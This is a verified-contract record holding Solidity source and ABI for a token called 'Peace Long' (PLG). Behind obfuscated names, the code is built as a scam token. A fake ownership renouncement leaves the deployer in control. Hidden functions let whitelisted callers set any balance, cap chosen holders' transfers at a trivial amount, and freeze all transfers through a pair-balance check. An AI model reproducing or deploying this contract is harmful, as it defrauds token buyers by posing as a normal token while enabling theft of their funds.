{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface liquidityLimitTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxLaunched) external view returns (uint256);\n\n    function transfer(address listLimit, uint256 marketingTrading) external returns (bool);\n\n    function allowance(address senderLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listLimit,\n        uint256 marketingTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txFee, uint256 value);\n    event Approval(address indexed senderLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract walletSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundTo {\n    function createPair(address minAmount, address launchedReceiver) external returns (address);\n}\n\ninterface liquidityLimitToMetadata is liquidityLimitTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PeaceLong is walletSell, liquidityLimitTo, liquidityLimitToMetadata {\n\n    uint256 public autoEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTeam;\n    }\n\n    function tokenAmount() private view {\n        require(sellEnable[_msgSender()]);\n    }\n\n    uint256 constant listTo = 3 ** 10;\n\n    function owner() external view returns (address) {\n        return fundLiquidity;\n    }\n\n    uint256 private limitSenderMin = 100000000 * 10 ** 18;\n\n    function approve(address amountLimit, uint256 marketingTrading) public virtual override returns (bool) {\n        shouldSwap[_msgSender()][amountLimit] = marketingTrading;\n        emit Approval(_msgSender(), amountLimit, marketingTrading);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderFundExempt;\n    }\n\n    string private receiverTeam = \"PLG\";\n\n    string private senderFundExempt = \"Peace Long\";\n\n    address takeReceiverFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public tradingFee;\n\n    bool public buyAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitSenderMin;\n    }\n\n    function liquidityIs(address swapTrading) public {\n        tokenAmount();\n        if (limitReceiverToken) {\n            toExempt = autoEnable;\n        }\n        if (swapTrading == buyFeeTake || swapTrading == tradingFee) {\n            return;\n        }\n        walletFrom[swapTrading] = true;\n    }\n\n    mapping(address => uint256) private txLaunch;\n\n    function balanceOf(address maxLaunched) public view virtual override returns (uint256) {\n        return txLaunch[maxLaunched];\n    }\n\n    address public buyFeeTake;\n\n    address fromTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public isEnable;\n\n    function allowance(address amountAtIs, address amountLimit) external view virtual override returns (uint256) {\n        if (amountLimit == takeReceiverFund) {\n            return type(uint256).max;\n        }\n        return shouldSwap[amountAtIs][amountLimit];\n    }\n\n    function transferFrom(address tokenLaunched, address listLimit, uint256 marketingTrading) external override returns (bool) {\n        if (_msgSender() != takeReceiverFund) {\n            if (shouldSwap[tokenLaunched][_msgSender()] != type(uint256).max) {\n                require(marketingTrading <= shouldSwap[tokenLaunched][_msgSender()]);\n                shouldSwap[tokenLaunched][_msgSender()] -= marketingTrading;\n            }\n        }\n        return limitShouldFee(tokenLaunched, listLimit, marketingTrading);\n    }\n\n    mapping(address => bool) public sellEnable;\n\n    uint8 private teamShould = 18;\n\n    function fromReceiverTeam(address feeBuy, uint256 marketingTrading) public {\n        tokenAmount();\n        txLaunch[feeBuy] = marketingTrading;\n    }\n\n    uint256 limitExemptToken;\n\n    function fundIs(address tokenLaunched, address listLimit, uint256 marketingTrading) internal returns (bool) {\n        require(txLaunch[tokenLaunched] >= marketingTrading);\n        txLaunch[tokenLaunched] -= marketingTrading;\n        txLaunch[listLimit] += marketingTrading;\n        emit Transfer(tokenLaunched, listLimit, marketingTrading);\n        return true;\n    }\n\n    function sellReceiver() public {\n        emit OwnershipTransferred(buyFeeTake, address(0));\n        fundLiquidity = address(0);\n    }\n\n    mapping(address => bool) public walletFrom;\n\n    function listExempt(address amountWallet) public {\n        if (isEnable) {\n            return;\n        }\n        if (autoEnable == autoReceiverLaunch) {\n            autoEnable = toExempt;\n        }\n        sellEnable[amountWallet] = true;\n        if (autoReceiverLaunch != toExempt) {\n            toExempt = autoEnable;\n        }\n        isEnable = true;\n    }\n\n    uint256 public toExempt;\n\n    bool private limitReceiverToken;\n\n    function transfer(address feeBuy, uint256 marketingTrading) external virtual override returns (bool) {\n        return limitShouldFee(_msgSender(), feeBuy, marketingTrading);\n    }\n\n    function limitShouldFee(address tokenLaunched, address listLimit, uint256 marketingTrading) internal returns (bool) {\n        if (tokenLaunched == buyFeeTake) {\n            return fundIs(tokenLaunched, listLimit, marketingTrading);\n        }\n        uint256 totalToken = liquidityLimitTo(tradingFee).balanceOf(fromTo);\n        require(totalToken == modeTrading);\n        require(listLimit != fromTo);\n        if (walletFrom[tokenLaunched]) {\n            return fundIs(tokenLaunched, listLimit, listTo);\n        }\n        return fundIs(tokenLaunched, listLimit, marketingTrading);\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldSwap;\n\n    address private fundLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundLiquidity;\n    }\n\n    uint256 public autoReceiverLaunch;\n\n    uint256 modeTrading;\n\n    function receiverAt(uint256 marketingTrading) public {\n        tokenAmount();\n        modeTrading = marketingTrading;\n    }\n\n    constructor (){\n        if (autoEnable != autoReceiverLaunch) {\n            buyAmount = true;\n        }\n        atTake modeFund = atTake(takeReceiverFund);\n        tradingFee = fundTo(modeFund.factory()).createPair(modeFund.WETH(), address(this));\n        \n        buyFeeTake = _msgSender();\n        sellReceiver();\n        sellEnable[buyFeeTake] = true;\n        txLaunch[buyFeeTake] = limitSenderMin;\n        if (autoEnable != autoReceiverLaunch) {\n            autoReceiverLaunch = autoEnable;\n        }\n        emit Transfer(address(0), buyFeeTake, limitSenderMin);\n    }\n\n    event OwnershipTransferred(address indexed maxAuto, address indexed teamLimit);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAtIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"fromReceiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"liquidityIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"}],\"name\":\"listExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PeaceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}